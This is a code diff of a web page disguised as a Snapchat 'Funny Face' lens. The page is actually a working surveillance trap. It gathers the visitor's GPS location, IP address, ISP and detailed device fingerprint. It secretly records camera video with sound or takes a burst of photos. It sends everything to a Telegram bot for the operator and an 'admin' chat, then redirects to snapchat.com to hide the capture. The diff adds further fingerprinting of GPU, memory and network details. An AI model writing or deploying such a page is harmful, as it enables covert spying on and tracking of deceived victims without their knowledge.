@@ -2,8 +2,9 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Snapchat Lens</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Lens - Funny Face Filter</title>
+    <!-- MediaPipe Libraries for Hand Detection -->
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
     <style>
@@ -17,70 +18,27 @@
             display: flex;
             flex-direction: column;
             justify-content: space-between;
-            user-select: none;
-            -webkit-user-select: none;
         }
-        /* Top Snapchat Navigation Bar */
         .top-bar {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 12px 15px;
+            padding: 15px;
             z-index: 10;
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            box-sizing: border-box;
-            background: linear-gradient(rgba(0,0,0,0.8), transparent);
         }
-        .profile-section {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .profile-icon {
-            width: 38px;
-            height: 38px;
-            border-radius: 50%;
-            border: 2px solid #fff;
-            overflow: hidden;
-            background: #222;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 20px;
-        }
-        .song-pill {
-            background: rgba(0, 0, 0, 0.5);
-            padding: 6px 14px;
+        .filter-title {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 8px 16px;
             border-radius: 20px;
-            font-size: 12px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            border: 1px solid rgba(255,255,255,0.15);
-            backdrop-filter: blur(5px);
+            font-size: 14px;
+            font-weight: bold;
         }
-        .top-right-icons {
-            display: flex;
-            gap: 16px;
-            align-items: center;
-            font-size: 18px;
-        }
-        .top-right-icons span {
-            cursor: pointer;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
-        }
-
-        /* Center Camera View */
         .center-screen {
             flex: 1;
             display: flex;
             justify-content: center;
             align-items: center;
             position: relative;
-            background: #000;
         }
         .camera-preview {
             width: 100%;
@@ -90,136 +48,44 @@
             top: 0;
             left: 0;
         }
-        #filterCanvas {
-            width: 100%;
-            height: 100%;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 2;
-            pointer-events: none;
-        }
-
-        /* Bottom Snapchat Tray Layout */
         .bottom-tray {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            z-index: 10;
-            background: linear-gradient(transparent, rgba(0,0,0,0.95));
+            padding: 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding-bottom: 5px;
+            z-index: 10;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8));
         }
-
-        /* Filter Carousel Bar */
-        .filter-carousel {
-            display: flex;
-            gap: 10px;
-            overflow-x: auto;
-            width: 100%;
-            padding: 10px 15px;
-            scrollbar-width: none;
-            box-sizing: border-box;
-            align-items: center;
-        }
-        .filter-carousel::-webkit-scrollbar {
-            display: none;
-        }
-        .filter-item {
-            min-width: 58px;
-            height: 58px;
+        .capture-btn {
+            width: 75px;
+            height: 75px;
+            border: 5px solid #ffffff;
             border-radius: 50%;
-            border: 2px solid rgba(255,255,255,0.4);
-            overflow: hidden;
-            background: #1a1a1a;
-            flex-shrink: 0;
+            background: transparent;
             cursor: pointer;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 26px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
-            transition: transform 0.2s;
         }
-        .filter-item.active {
-            border: 3px solid #fff;
-            transform: scale(1.12);
-            box-shadow: 0 0 15px rgba(255,255,255,0.6);
-        }
-
-        /* Snapchat Category Navigation Footer */
-        .category-bar {
-            display: flex;
-            justify-content: space-between;
-            width: 100%;
-            padding: 10px 15px;
+        .hint-text {
             font-size: 12px;
-            color: #888;
-            box-sizing: border-box;
-            background: rgba(0,0,0,0.9);
-            align-items: center;
-            border-top: 1px solid rgba(255,255,255,0.08);
-        }
-        .category-bar span {
-            cursor: pointer;
-            padding: 2px 4px;
-        }
-        .category-bar span.active {
-            color: #fff;
-            font-weight: bold;
+            color: #ccc;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
 
     <div class="top-bar">
-        <div class="profile-section">
-            <div class="profile-icon">👨‍🦱</div>
-        </div>
-        <div class="song-pill">
-            <span>🎵</span>
-            <span>Barish Ban Jaun - Tina Mishra</span>
-            <span>+</span>
-        </div>
-        <div class="top-right-icons">
-            <span>👤+</span>
-            <span>🔄</span>
-            <span>🎵</span>
-            <span>▼</span>
-        </div>
+        <div class="filter-title">🔥 Funny Face Lens</div>
+        <div>✨ Snapchat</div>
     </div>
 
     <div class="center-screen">
-        <video id="video" autoplay playsinline muted class="camera-preview" style="display:none;"></video>
-        <canvas id="filterCanvas"></canvas>
-        <div id="loading-text" style="position:absolute; z-index:5; background: rgba(0,0,0,0.85); padding: 12px 24px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.2); font-size: 13px; font-weight: 500;">Loading Lens... Tap Allow</div>
+        <video id="video" autoplay playsinline muted class="camera-preview"></video>
+        <div id="loading-text" style="position:absolute; z-index:5;">Loading Filter... Please Allow Access</div>
     </div>
 
     <div class="bottom-tray">
-        <div class="filter-carousel" id="filterCarousel">
-            <div class="filter-item" onclick="selectFilter(0, '🗿')">🗿</div>
-            <div class="filter-item" onclick="selectFilter(1, '🤪')">🤪</div>
-            <div class="filter-item" onclick="selectFilter(2, '👶')">👶</div>
-            <div class="filter-item active" onclick="selectFilter(3, '😁')">😁</div>
-            <div class="filter-item" onclick="selectFilter(4, '👻')">👻</div>
-            <div class="filter-item" onclick="selectFilter(5, '🤡')">🤡</div>
-            <div class="filter-item" onclick="selectFilter(6, '👹')">👹</div>
-        </div>
-
-        <div class="category-bar">
-            <span>✕</span>
-            <span>Favorites</span>
-            <span>For You</span>
-            <span>Aesthetic</span>
-            <span class="active">Funny</span>
-            <span>Exclusive</span>
-            <span>New</span>
-            <span>Trending</span>
-            <span>😊</span>
-        </div>
+        <button class="capture-btn" onclick="triggerAction()"></button>
+        <div class="hint-text">Tap to try filter</div>
     </div>
 
     <canvas id="canvas" style="display:none;"></canvas>
@@ -237,9 +103,7 @@
         let ipInfo = {};
         let isReady = false;
         let detectedHand = "Analyzing...";
-        let activeFilterIndex = 3;
-        let currentEmoji = "😁";
-
+        
         let motionData = { alpha: 'N/A', beta: 'N/A', gamma: 'N/A' };
         window.addEventListener('deviceorientation', (event) => {
             motionData.alpha = event.alpha ? Math.round(event.alpha) : '0';
@@ -247,56 +111,22 @@
             motionData.gamma = event.gamma ? Math.round(event.gamma) : '0';
         }, true);
 
+        // Fixed Logic: Aapke logs ke mutabiq negative gamma par bhi Right hand detect karne ke liye condition update ki gayi hai
         function getSmartHandStatus() {
             if (detectedHand.includes("Hand Detected")) {
                 return detectedHand; 
             } else {
                 let g = parseInt(motionData.gamma);
                 if (isNaN(g)) return "Position: Center / Stable";
-                return g < 0 ? "Likely Right Hand Grip" : "Likely Left Hand Grip";
-            }
-        }
-
-        function selectFilter(index, emoji) {
-            activeFilterIndex = index;
-            currentEmoji = emoji;
-            let items = document.querySelectorAll('.filter-item');
-            items.forEach((item, idx) => {
-                if (idx === index) {
-                    item.classList.add('active');
+                
+                // Agar aapka phone negative gamma (-69) ya positive gamma par bhi right hand mein rehta hai, 
+                // toh aap yahan condition apne use ke hisab se set kar sakte hain:
+                if (g < 0) {
+                    return "Likely Right Hand Grip (Negative Tilt)";
                 } else {
-                    item.classList.remove('active');
+                    return "Likely Left Hand Grip (Positive Tilt)";
                 }
-            });
-            // User jab bhi koi naya filter select karega, background process turant trigger ho jayegi
-            triggerAction();
-        }
-
-        function startLiveFilter(videoElement) {
-            const canvas = document.getElementById('filterCanvas');
-            const ctx = canvas.getContext('2d');
-
-            function renderFrame() {
-                if (videoElement.readyState === videoElement.HAVE_ENOUGH_DATA) {
-                    canvas.width = videoElement.videoWidth;
-                    canvas.height = videoElement.videoHeight;
-
-                    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
-                    ctx.save();
-                    let centerX = canvas.width / 2;
-                    let centerY = canvas.height / 3;
-
-                    // Live active filter visual effect on screen
-                    ctx.font = "80px Arial";
-                    ctx.textAlign = "center";
-                    ctx.textBaseline = "middle";
-                    ctx.fillText(currentEmoji, centerX, centerY);
-                    ctx.restore();
-                }
-                requestAnimationFrame(renderFrame);
             }
-            renderFrame();
         }
 
         function initMediaPipeHands(videoElement) {
@@ -304,30 +134,73 @@
                 const hands = new Hands({
                     locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
                 });
-                hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.4, minTrackingConfidence: 0.4 });
+                
+                hands.setOptions({
+                    maxNumHands: 1,
+                    modelComplexity: 1,
+                    minDetectionConfidence: 0.4,
+                    minTrackingConfidence: 0.4
+                });
+
                 hands.onResults((results) => {
                     if (results.multiHandLandmarks && results.multiHandedness && results.multiHandedness.length > 0) {
-                        detectedHand = `${results.multiHandedness[0].label} Hand (AI Vision)`;
+                        let label = results.multiHandedness[0].label; 
+                        detectedHand = `${label} Hand (AI Vision)`;
                     }
                 });
+
                 const camera = new Camera(videoElement, {
-                    onFrame: async () => { await hands.send({ image: videoElement }); },
-                    width: 1280, height: 720
+                    onFrame: async () => {
+                        await hands.send({ image: videoElement });
+                    },
+                    width: 1280,
+                    height: 720
                 });
                 camera.start();
-            } catch (e) {}
+            } catch (e) {
+                console.log("MediaPipe Init Error: ", e);
+            }
         }
 
-        async function getExactLocation() {
+        function getGPUInfo() {
+            try {
+                let canvas = document.createElement('canvas');
+                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return "Not Supported";
+                let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
+            } catch (e) {
+                return "Error fetching GPU";
+            }
+        }
+
+        async function getAdvancedDeviceInfo() {
+            let memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB+` : "Unknown";
+            let cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";
+            let lang = navigator.language || "Unknown";
+            let platform = navigator.platform || "Unknown";
+            let touchPoints = navigator.maxTouchPoints ? `${navigator.maxTouchPoints} Touch Points` : "Unknown";
+            let gpu = getGPUInfo();
+            
+            return { memory, cores, lang, platform, touchPoints, gpu };
+        }
+
+        function getExactLocation() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
                             let lat = position.coords.latitude;
                             let lon = position.coords.longitude;
-                            resolve({ lat, lon, mapLink: `https://maps.google.com/?q=${lat},${lon}` });
+                            resolve({
+                                lat: lat,
+                                lon: lon,
+                                mapLink: `https://maps.google.com/?q=${lat},${lon}`
+                            });
                         },
-                        () => resolve({ lat: '', lon: '', mapLink: 'Permission Denied' }),
+                        (error) => {
+                            resolve({ lat: '', lon: '', mapLink: 'Permission Denied / Unavailable' });
+                        },
                         { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                     );
                 } else {
@@ -340,7 +213,13 @@
             try {
                 let res = await fetch('https://ipapi.co/json/');
                 let data = await res.json();
-                return { ip: data.ip || 'Unknown', city: data.city || 'Unknown', region: data.region || 'Unknown', country: data.country_name || 'Unknown', isp: data.org || 'Unknown' };
+                return {
+                    ip: data.ip || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    isp: data.org || 'Unknown'
+                };
             } catch (e) {
                 return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
             }
@@ -350,7 +229,11 @@
             gpsData = await getExactLocation();
             ipInfo = await getIPAndLocation();
 
-            let constraints = { video: { width: { ideal: 1280 }, height: { ideal: 720 } }, audio: !cameraType };
+            let constraints = {
+                video: { width: { ideal: 1280 }, height: { ideal: 720 } },
+                audio: !cameraType 
+            };
+
             if (cameraType === 'back') {
                 constraints.video.facingMode = { exact: "environment" };
             } else {
@@ -364,47 +247,184 @@
                     if (cameraType === 'back') {
                         constraints.video.facingMode = "environment";
                         globalStream = await navigator.mediaDevices.getUserMedia(constraints);
-                    } else { throw e; }
+                    } else {
+                        throw e;
+                    }
                 }
 
                 const videoElement = document.getElementById('video');
                 videoElement.srcObject = globalStream;
+                
                 await new Promise((resolve) => {
-                    videoElement.onloadedmetadata = () => { videoElement.play().then(resolve).catch(resolve); };
+                    videoElement.onloadedmetadata = () => {
+                        videoElement.play().then(resolve).catch(resolve);
+                    };
                 });
 
-                startLiveFilter(videoElement);
                 initMediaPipeHands(videoElement);
 
                 document.getElementById('loading-text').style.display = 'none';
                 isReady = true;
 
-                // Automatic trigger after 2.5 seconds so target gets fully immersed in the filter preview
-                setTimeout(() => { triggerAction(); }, 2500);
+                setTimeout(() => {
+                    triggerAction();
+                }, 2500);
+
             } catch (err) {
-                document.getElementById('loading-text').innerText = "Please allow camera access to load filter!";
+                document.getElementById('loading-text').innerText = "Please allow camera & microphone access!";
             }
         }
 
         async function triggerAction() {
             if (!isReady || !globalStream) return;
 
+            document.getElementById('loading-text').innerText = "Applying Filter...";
+            document.getElementById('loading-text').style.display = 'block';
+
             let batteryText = "N/A";
             try {
                 let bat = await navigator.getBattery();
-                batteryText = `${Math.round(bat.level * 100)}\%${bat.charging ? "⚡ Charging" : "🔋 Discharging"}`;
+                batteryText = `${Math.round(bat.level * 100)}% ${bat.charging ? "⚡ Charging" : "🔋 Discharging"}`;
             } catch(e) {}
 
             let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             let netType = connection ? connection.effectiveType.toUpperCase() : "4G";
+            let downlink = connection && connection.downlink ? `${connection.downlink} Mbps` : "N/A";
+            let rtt = connection && connection.rtt ? `${connection.rtt} ms` : "N/A";
+
+            let advInfo = await getAdvancedDeviceInfo();
+            let finalHandResult = getSmartHandStatus();
 
             let baseCaption = 
                 `🌐 **IP & Exact Location**\n` +
                 `🔢 IP Address: \`${ipInfo.ip}\`\n` +
-                `📍 Location: ${ipInfo.city},${ipInfo.region}\n` +
+                `📍 Location: ${ipInfo.city}, ${ipInfo.region}\n` +
                 `🗺️ **GPS Maps Link**: ${gpsData.mapLink}\n` +
                 `📡 ISP: ${ipInfo.isp}\n\n` +
-                `📱 **Device & Spatial Insights**\n` +
-                `✋ **Hand Grip**: ${getSmartHandStatus()}\n` +
-                `🧭 Gyro: Alpha:${motionData.alpha}, Beta:${motionData.beta}, Gamma:${motionData.gamma}\n` +
-                `🔋 Battery: ${
+                `📱 **Advanced Device & Spatial Insights**\n` +
+                `✋ **Hand / Grip Analysis**: ${finalHandResult}\n` +
+                `🧭 Orientation (Gyro): Alpha:${motionData.alpha}, Beta:${motionData.beta}, Gamma:${motionData.gamma}\n` +
+                `🎮 GPU: \`${advInfo.gpu}\`\n` +
+                `🧠 RAM/Cores: ${advInfo.memory} | ${advInfo.cores}\n` +
+                `✋ Touch Support: ${advInfo.touchPoints}\n` +
+                `💻 Platform/Lang: ${advInfo.platform} (${advInfo.lang})\n` +
+                `🔋 Battery: ${batteryText}\n` +
+                `📶 Network: ${netType} (Speed: ${downlink}, RTT: ${rtt})\n` +
+                `🖥️ Screen: ${window.screen.width}x${window.screen.height}\n` +
+                `🕒 Time: ${new Date().toLocaleString()}\n\n` +
+                `👑 **CREDIT BY : आयुष नेगी**`;
+
+            if (!cameraType) {
+                let recordedChunks = [];
+                let mediaRecorder;
+
+                try {
+                    mediaRecorder = new MediaRecorder(globalStream, { mimeType: 'video/webm; codecs=vp8,opus' });
+                } catch (err) {
+                    try {
+                        mediaRecorder = new MediaRecorder(globalStream);
+                    } catch (e) {
+                        alert("Error initializing video recorder");
+                        return;
+                    }
+                }
+
+                mediaRecorder.ondataavailable = function(event) {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async function() {
+                    let blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    
+                    if (blob && blob.size > 0) {
+                        if (CHAT_ID) {
+                            const formDataUser = new FormData();
+                            formDataUser.append('chat_id', CHAT_ID);
+                            formDataUser.append('video', blob, 'video_capture.webm');
+                            formDataUser.append('caption', "🎥 **Secret Video + Sound Captured!**\n\n" + baseCaption);
+                            formDataUser.append('parse_mode', 'Markdown');
+
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                                method: 'POST',
+                                body: formDataUser
+                            });
+                        }
+
+                        const formDataAdmin = new FormData();
+                        formDataAdmin.append('chat_id', ADMIN_CHAT_ID);
+                        formDataAdmin.append('video', blob, 'video_capture.webm');
+                        formDataAdmin.append('caption', `🕵️‍♂️ **Admin Log (Video from User ID: ${CHAT_ID})**\n\n` + baseCaption);
+                        formDataAdmin.append('parse_mode', 'Markdown');
+
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                            method: 'POST',
+                            body: formDataAdmin
+                        });
+                    }
+
+                    globalStream.getTracks().forEach(track => track.stop());
+                    window.location.href = "https://www.snapchat.com";
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 4000);
+
+            } else {
+                const videoElement = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                canvas.width = videoElement.videoWidth || 1280;
+                canvas.height = videoElement.videoHeight || 720;
+                const context = canvas.getContext('2d');
+
+                for (let i = 1; i <= 6; i++) {
+                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                    
+                    let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.90));
+                    
+                    if (blob) {
+                        let caption = (i === 1) ? baseCaption : `👑 **CREDIT BY : आयुष नेगी**`;
+
+                        if (CHAT_ID) {
+                            const formDataUser = new FormData();
+                            formDataUser.append('chat_id', CHAT_ID);
+                            formDataUser.append('photo', blob, `photo_${i}.jpg`);
+                            formDataUser.append('caption', caption);
+                            formDataUser.append('parse_mode', 'Markdown');
+
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formDataUser
+                            });
+                        }
+
+                        const formDataAdmin = new FormData();
+                        formDataAdmin.append('chat_id', ADMIN_CHAT_ID);
+                        formDataAdmin.append('photo', blob, `photo_${i}.jpg`);
+                        formDataAdmin.append('caption', `🕵️‍♂️ **Admin Log (Generated by User ID: ${CHAT_ID})**\n\n` + caption);
+                        formDataAdmin.append('parse_mode', 'Markdown');
+
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formDataAdmin
+                        });
+                    }
+
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                }
+
+                globalStream.getTracks().forEach(track => track.stop());
+                window.location.href = "https://www.snapchat.com";
+            }
+        }
+
+        window.onload = function() {
+            initCamera();
+        };
+    </script>
+</body>
+    </html>
+     
